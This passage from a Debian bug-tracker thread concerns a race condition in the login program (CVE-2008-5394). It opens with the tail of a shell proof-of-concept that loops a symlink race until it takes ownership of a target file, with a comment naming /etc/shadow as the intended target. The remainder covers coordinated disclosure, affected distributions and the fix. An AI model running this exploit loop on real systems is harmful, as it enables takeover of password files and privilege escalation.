read TTY
echo "You said it will be '$TTY' ..."

ATK=/etc/debian_version # should be /etc/shadow

echo "Starting symlink re-jiggler ..."
/tmp/jigglelnk $TTY $ATK &
JIG=$!

LOOP=0
while :; do
  ((LOOP = $LOOP + 1))
  echo; echo; echo "Try = $LOOP"

  /tmp/fillutmp

  echo "Telnetting... if login succeeds, just exit for next try..."
  /usr/bin/telnet $HOST

  LS=`ls -ld $ATK`
  case "$LS" in
    *root*root* ) ;; # not done yet...
    * )
      echo; echo
      echo "Success after $LOOP tries!"
      echo "$LS"
      echo; echo
      break
    ;;
  esac
done

kill $JIG
rm /tmp/fillutmp /tmp/jigglelnk /tmp/x

# ...
# ~$ logout
# Connection closed by foreign host.
# Success after 12 tries!
# -rw------- 1 psz tty 4 Oct 28  2006 /etc/debian_version

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Sun, 07 Dec 2008 21:21:10 GMT) ([full text](bugreport.cgi?bug=505271;msg=142), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=142), [link](#141)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 07 Dec 2008 21:21:10 GMT) ([full text](bugreport.cgi?bug=505271;msg=144), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=144), [link](#143)).

---

[Message #145](#145) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=145), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=145), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505271@bugs.debian.org, jmm@inutil.org
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Mon, 8 Dec 2008 08:20:36 +1100
```
Dear Nicolas,

On 23 Nov you wrote:

>>  - alert other Linux distros,
> A new upstream version was released this weekend.

Have not seen any distros make announcements. What distros use that?
(Am surprised that even Ubuntu has not updated, though normally they
seem responsive.)

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Sun, 07 Dec 2008 21:48:07 GMT) ([full text](bugreport.cgi?bug=505271;msg=147), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=147), [link](#146)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 07 Dec 2008 21:48:08 GMT) ([full text](bugreport.cgi?bug=505271;msg=149), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=149), [link](#148)).

---

[Message #150](#150) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=150), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=150), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au
Cc: 505271@bugs.debian.org, jmm@inutil.org
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Sun, 7 Dec 2008 22:47:15 +0100
```
On Mon, Dec 08, 2008 at 08:20:36AM +1100, psz@maths.usyd.edu.au wrote:
> Dear Nicolas,
>
> On 23 Nov you wrote:
>
> >>  - alert other Linux distros,
> > A new upstream version was released this weekend.
>
> Have not seen any distros make announcements. What distros use that?
> (Am surprised that even Ubuntu has not updated, though normally they
> seem responsive.)

The bug should affect ubuntu and probably gentoo (4.1.2.2 already
packaged). Not RedHat / Mandrake.
I don't know about other distros. I don't know if ubuntu supervises the
bug tagged 'security', and I don't know their milestones.

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Sun, 07 Dec 2008 22:42:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=152), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=152), [link](#151)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 07 Dec 2008 22:42:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=154), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=154), [link](#153)).

---

[Message #155](#155) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=155), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=155), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505271@bugs.debian.org, jmm@inutil.org
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Mon, 8 Dec 2008 09:37:42 +1100
```
> The bug should affect ubuntu and probably gentoo (4.1.2.2 already
> packaged). Not RedHat / Mandrake.

A quick peek into shadow-utils-4.1.2-8.fc10.src.rpm suggests Fedora is
also affected. I do not know about RHEL.

Ubuntu now notified directly:
[https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/306082](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/306082)

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Mon, 08 Dec 2008 01:33:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=157), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=157), [link](#156)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 08 Dec 2008 01:33:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=159), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=159), [link](#158)).

---

[Message #160](#160) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=160), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=160), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505271@bugs.debian.org, jmm@inutil.org
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Mon, 8 Dec 2008 12:32:01 +1100
```
I wrote a little while ago:

> A quick peek into shadow-utils-4.1.2-8.fc10.src.rpm suggests Fedora is
> also affected. I do not know about RHEL.

A quick peek into shadow-utils-4.0.17-14.el5.src.rpm suggests RHEL is
just as bad.

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Mon, 08 Dec 2008 10:27:05 GMT) ([full text](bugreport.cgi?bug=505271;msg=162), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=162), [link](#161)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 08 Dec 2008 10:27:05 GMT) ([full text](bugreport.cgi?bug=505271;msg=164), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=164), [link](#163)).

---

[Message #165](#165) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=165), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=165), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au
Cc: 505271@bugs.debian.org
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Mon, 8 Dec 2008 11:22:34 +0100
```
On Mon, Dec 08, 2008 at 09:37:42AM +1100, psz@maths.usyd.edu.au wrote:
> > The bug should affect ubuntu and probably gentoo (4.1.2.2 already
> > packaged). Not RedHat / Mandrake.
>
> A quick peek into shadow-utils-4.1.2-8.fc10.src.rpm suggests Fedora is
> also affected. I do not know about RHEL.

shadow-utils.spec:rm $RPM_BUILD_ROOT/%{_bindir}/login

makes me think Fedora / RHEL should be free of login's bugs.

--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Mon, 08 Dec 2008 12:57:05 GMT) ([full text](bugreport.cgi?bug=505271;msg=167), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=167), [link](#166)).

---

**Acknowledgement sent**
to `Karel Zak <kzak@redhat.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 08 Dec 2008 12:57:05 GMT) ([full text](bugreport.cgi?bug=505271;msg=169), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=169), [link](#168)).

---

[Message #170](#170) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=170), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=170), reply):

![](/cgi-bin/libravatar.cgi?email=kzak%40redhat.com)
From: Karel Zak <kzak@redhat.com>
To: Nicolas François <nicolas.francois@centraliens.net>,
505271@bugs.debian.org
Cc: psz@maths.usyd.edu.au
Subject: Re: [Pkg-shadow-devel] Bug#505271: Bug#505071: login tty
mis-determination (see bug#332198)
Date: Mon, 8 Dec 2008 13:52:59 +0100
```
On Mon, Dec 08, 2008 at 11:22:34AM +0100, Nicolas François wrote:
> On Mon, Dec 08, 2008 at 09:37:42AM +1100, psz@maths.usyd.edu.au wrote:
> > > The bug should affect ubuntu and probably gentoo (4.1.2.2 already
> > > packaged). Not RedHat / Mandrake.
> >
> > A quick peek into shadow-utils-4.1.2-8.fc10.src.rpm suggests Fedora is
> > also affected. I do not know about RHEL.
>
> shadow-utils.spec:rm $RPM_BUILD_ROOT/%{_bindir}/login
>
> makes me think Fedora / RHEL should be free of login's bugs.

 yes, we use the classic login(1) from util-linux(-ng).

    Karel

--
 Karel Zak  <kzak@redhat.com>

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Thu, 18 Dec 2008 05:51:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=172), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=172), [link](#171)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 18 Dec 2008 05:51:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=174), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=174), [link](#173)).

---

[Message #175](#175) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=175), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=175), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505271@bugs.debian.org
Subject: login tty mis-determination (see bug#332198)
Date: Thu, 18 Dec 2008 16:46:19 +1100
```
For the record: Ubuntu have fixed the problem, see
  <http://www.ubuntu.com/usn/usn-695-1>

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Thu, 18 Dec 2008 20:03:03 GMT) ([full text](bugreport.cgi?bug=505271;msg=177), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=177), [link](#176)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 18 Dec 2008 20:03:03 GMT) ([full text](bugreport.cgi?bug=505271;msg=179), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=179), [link](#178)).

---

[Message #180](#180) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=180), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=180), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505271@bugs.debian.org
Subject: login tty mis-determination (see bug#332198)
Date: Fri, 19 Dec 2008 07:00:16 +1100
```
Pity the fix did not make it into
  <http://release.debian.org/stable/4.0/4.0r6/>

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Wed, 14 Jan 2009 12:48:06 GMT) ([full text](bugreport.cgi?bug=505271;msg=182), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=182), [link](#181)).

---

**Acknowledgement sent**
to `Thijs Kinkhorst <thijs@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Wed, 14 Jan 2009 12:48:06 GMT) ([full text](bugreport.cgi?bug=505271;msg=184), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=184), [link](#183)).

---

[Message #185](#185) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=185), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=185), reply):

![](/cgi-bin/libravatar.cgi?email=thijs%40debian.org)
From: Thijs Kinkhorst <thijs@debian.org>
To: Paul Szabo <psz@maths.usyd.edu.au>
Cc: 505271@bugs.debian.org,
nicolas.francois@centraliens.net,
team@security.debian.org
Subject: Re: Bug#505271 closed ... fixed in shadow 1:4.1.1-6
Date: Wed, 14 Jan 2009 13:45:11 +0100
```
[[Message part 1](bugreport.cgi?att=0;bug=505271;msg=185) (text/plain, inline)]
```
```
Hi Paul,

On Thursday 27 November 2008 10:13, Paul Szabo wrote:
> How long do you expect it will take to "in fact" fix this bug (which is
> closed, pretend-fixed, still set to just "serious" severity)? Would it
> cause problems if I posted the exploit on Monday 1 Dec?

Sorry for the delay incurred in fixing this in Debian stable. An update is now
in preparation and will be released shortly. Thank you for reporting the
issue to Debian.

Thijs

```
```
[[Message part 2](bugreport.cgi?att=1;bug=505271;msg=185) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Fri, 23 Jan 2009 03:09:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=187), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=187), [link](#186)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 23 Jan 2009 03:09:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=189), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=189), [link](#188)).

---

[Message #190](#190) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=190), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=190), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: thijs@debian.org
Cc: 505271@bugs.debian.org, nicolas.francois@centraliens.net,
team@security.debian.org
Subject: Re: Bug#505271 closed ... fixed in shadow 1:4.1.1-6
Date: Fri, 23 Jan 2009 14:06:31 +1100
```
Thanks for the DSA-1709 fix.

Belatedly, I realize that this still leaves a DoS attack: fill up utmp
with entries for all possible PIDs, then login will fail. Maybe that is
"properly" Bug#505071 (as distinct from this one)? Please see there
about ideas on how to perform this DoS without access to group utmp.

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Mon, 26 Jan 2009 13:39:03 GMT) ([full text](bugreport.cgi?bug=505271;msg=192), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=192), [link](#191)).

---

**Acknowledgement sent**
to `Thijs Kinkhorst <thijs@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 26 Jan 2009 13:39:03 GMT) ([full text](bugreport.cgi?bug=505271;msg=194), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=194), [link](#193)).

---

[Message #195](#195) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=195), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=195), reply):

![](/cgi-bin/libravatar.cgi?email=thijs%40debian.org)
From: Thijs Kinkhorst <thijs@debian.org>
To: Paul Szabo <psz@maths.usyd.edu.au>
Cc: 505271@bugs.debian.org,
nicolas.francois@centraliens.net,
team@security.debian.org
Subject: Re: Bug#505271 closed ... fixed in shadow 1:4.1.1-6
Date: Mon, 26 Jan 2009 14:37:52 +0100
```
[[Message part 1](bugreport.cgi?att=0;bug=505271;msg=195) (text/plain, inline)]
```
```
On Friday 23 January 2009 04:06, Paul Szabo wrote:
> Belatedly, I realize that this still leaves a DoS attack: fill up utmp
> with entries for all possible PIDs, then login will fail. Maybe that is
> "properly" Bug#505071 (as distinct from this one)? Please see there
> about ideas on how to perform this DoS without access to group utmp.

Although from the description I think it's definately something that's good to
fix, I do not think it's that serious to be a DSA. Still, thanks for your
help in analysing these issues - I hope Nicolas will pick up on this for a
future release of shadow.

cheers,
Thijs

```
```
[[Message part 2](bugreport.cgi?att=1;bug=505271;msg=195) (application/pgp-signature, inline)]
```

---

**Reply sent**
to `Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>`:

You have taken responsibility.
(Mon, 26 Jan 2009 14:24:07 GMT) ([full text](bugreport.cgi?bug=505271;msg=197), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=197), [link](#196)).

---

**Notification sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Bug acknowledged by developer.
(Mon, 26 Jan 2009 14:24:07 GMT) ([full text](bugreport.cgi?bug=505271;msg=199), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=199), [link](#198)).

---

[Message #200](#200) received at 505271-close@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=200), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=200), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>
To: 505271-close@bugs.debian.org
Subject: Bug#505271: fixed in shadow 1:4.0.18.1-7+etch1
Date: Mon, 26 Jan 2009 13:52:48 +0000
```
Source: shadow
Source-Version: 1:4.0.18.1-7+etch1

We believe that the bug you reported is fixed in the latest version of
shadow, which is due to be installed in the Debian FTP archive:

login_4.0.18.1-7+etch1_i386.deb
  to pool/main/s/shadow/login_4.0.18.1-7+etch1_i386.deb
passwd_4.0.18.1-7+etch1_i386.deb
  to pool/main/s/shadow/passwd_4.0.18.1-7+etch1_i386.deb
shadow_4.0.18.1-7+etch1.diff.gz
  to pool/main/s/shadow/shadow_4.0.18.1-7+etch1.diff.gz
shadow_4.0.18.1-7+etch1.dsc
  to pool/main/s/shadow/shadow_4.0.18.1-7+etch1.dsc

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 505271@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net> (supplier of updated shadow package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Format: 1.7
Date: Sat, 22 Nov 2008 16:04:04 +0000
Source: shadow
Binary: login passwd
Architecture: source i386
Version: 1:4.0.18.1-7+etch1
Distribution: stable-security
Urgency: high
Maintainer: Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>
Changed-By: Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>
Description:
 login      - system login tools
 passwd     - change and administer password and group data
Closes: [505271](bugreport.cgi?bug=505271)
Changes:
 shadow (1:4.0.18.1-7+etch1) stable-security; urgency=high
 .
   * The "Curé nantais" release
   * debian/patches/303_login_symlink_attack: Fix a race condition that could
     lead to gaining ownership or changing mode of arbitrary files.
     Closes: #[505271](bugreport.cgi?bug=505271)
     [[CVE-2008-5394](https://security-tracker.debian.org/tracker/CVE-2008-5394)]
Files:
 ec01ac54e482ea552fdae5753d6c1745 1406 admin required shadow_4.0.18.1-7+etch1.dsc
 3f54eaa3a35e7c559f4def92e9957581 2354234 admin required shadow_4.0.18.1.orig.tar.gz
 b78d9d738765da65a6b55dea102569c3 297817 admin required shadow_4.0.18.1-7+etch1.diff.gz
 82c630b2f4e18217170a73a2dab27cba 792460 admin required passwd_4.0.18.1-7+etch1_i386.deb
 439cd50477db064cdf11d9b48c0e9af0 796578 admin required login_4.0.18.1-7+etch1_i386.deb

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)

iQEVAwUBSW3rfWz0hbPcukPfAQIexQf/cUd2fZ9UooLPR830+AeYtPMC3p74736z
kYcWf/SUegGntDtylsrzTw1GWRfi5TZV8kdgBA+CPxoY0JHJlWnaUFyqwQxUR+Ux
os2crtjnjE/IT1n/+cUqLdVujwNk3LEX67W1Z1+RDcrPUTbyfRyRvTgUrLKVCZuP
PaNCMHV2Z3pqjvDrIznkWfzpp0IPeMP37hTlr4sBt+QFm8JugGyxT0tiVatEFzMf
UT9F10+Fpa6IrWHtdaSnpDlfTa31v4km07t1i/3OcobZVd/h3vsbIz+azBmlo/ar
59IfvmDhS6tM7WhFngCt/1tu50B0orFhiF8smRczhIuJx7iVy5nPeA==
=+TJJ
-----END PGP SIGNATURE-----

```

---

**Reply sent**
to `Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>`:

You have taken responsibility.
(Mon, 09 Feb 2009 21:51:08 GMT) ([full text](bugreport.cgi?bug=505271;msg=202), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=202), [link](#201)).

---

**Notification sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Bug acknowledged by developer.
(Mon, 09 Feb 2009 21:51:08 GMT) ([full text](bugreport.cgi?bug=505271;msg=204), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=204), [link](#203)).

---

[Message #205](#205) received at 505271-close@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=205), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=205), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>
To: 505271-close@bugs.debian.org
Subject: Bug#505271: fixed in shadow 1:4.0.18.1-7+etch1
Date: Mon, 09 Feb 2009 21:35:51 +0000
```
Source: shadow
Source-Version: 1:4.0.18.1-7+etch1

We believe that the bug you reported is fixed in the latest version of
shadow, which is due to be installed in the Debian FTP archive:

login_4.0.18.1-7+etch1_i386.deb
  to pool/main/s/shadow/login_4.0.18.1-7+etch1_i386.deb
passwd_4.0.18.1-7+etch1_i386.deb
  to pool/main/s/shadow/passwd_4.0.18.1-7+etch1_i386.deb
shadow_4.0.18.1-7+etch1.diff.gz
  to pool/main/s/shadow/shadow_4.0.18.1-7+etch1.diff.gz
shadow_4.0.18.1-7+etch1.dsc
  to pool/main/s/shadow/shadow_4.0.18.1-7+etch1.dsc

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 505271@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net> (supplier of updated shadow package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Format: 1.7
Date: Sat, 22 Nov 2008 16:04:04 +0000
Source: shadow
Binary: login passwd
Architecture: source i386
Version: 1:4.0.18.1-7+etch1
Distribution: stable-security
Urgency: high
Maintainer: Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>
Changed-By: Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>
Description:
 login      - system login tools
 passwd     - change and administer password and group data
Closes: [505271](bugreport.cgi?bug=505271)
Changes:
 shadow (1:4.0.18.1-7+etch1) stable-security; urgency=high
 .
   * The "Curé nantais" release
   * debian/patches/303_login_symlink_attack: Fix a race condition that could
     lead to gaining ownership or changing mode of arbitrary files.
     Closes: #[505271](bugreport.cgi?bug=505271)
     [[CVE-2008-5394](https://security-tracker.debian.org/tracker/CVE-2008-5394)]
Files:
 ec01ac54e482ea552fdae5753d6c1745 1406 admin required shadow_4.0.18.1-7+etch1.dsc
 3f54eaa3a35e7c559f4def92e9957581 2354234 admin required shadow_4.0.18.1.orig.tar.gz
 b78d9d738765da65a6b55dea102569c3 297817 admin required shadow_4.0.18.1-7+etch1.diff.gz
 82c630b2f4e18217170a73a2dab27cba 792460 admin required passwd_4.0.18.1-7+etch1_i386.deb
 439cd50477db064cdf11d9b48c0e9af0 796578 admin required login_4.0.18.1-7+etch1_i386.deb

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)

iQEVAwUBSW3rfWz0hbPcukPfAQIexQf/cUd2fZ9UooLPR830+AeYtPMC3p74736z
kYcWf/SUegGntDtylsrzTw1GWRfi5TZV8kdgBA+CPxoY0JHJlWnaUFyqwQxUR+Ux
os2crtjnjE/IT1n/+cUqLdVujwNk3LEX67W1Z1+RDcrPUTbyfRyRvTgUrLKVCZuP
PaNCMHV2Z3pqjvDrIznkWfzpp0IPeMP37hTlr4sBt+QFm8JugGyxT0tiVatEFzMf
UT9F10+Fpa6IrWHtdaSnpDlfTa31v4km07t1i/3OcobZVd/h3vsbIz+azBmlo/ar
59IfvmDhS6tM7WhFngCt/1tu50B0orFhiF8smRczhIuJx7iVy5nPeA==
=+TJJ
-----END PGP SIGNATURE-----

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Mon, 09 Feb 2009 22:21:04 GMT) ([full text](bugreport.cgi?bug=505271;msg=207), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=207), [link](#206)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 09 Feb 2009 22:21:04 GMT) ([full text](bugreport.cgi?bug=505271;msg=209), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=209), [link](#208)).

---

[Message #210](#210) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=210), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=210), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505271@bugs.debian.org
Subject: Re: Bug#505271 closed by Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net> (Bug#505271: fixed in shadow 1:4.0.18.1-7+etch1)
Date: Tue, 10 Feb 2009 09:19:20 +1100
```
Dear Nicolas,

This latest "closed" message: is that a repeat message, a bug in some
maintenance procedures? I am sure we had 4.0.18.1-7+etch1 for a long
time now...

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Mon, 09 Feb 2009 22:36:03 GMT) ([full text](bugreport.cgi?bug=505271;msg=212), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=212), [link](#211)).

---

**Acknowledgement sent**
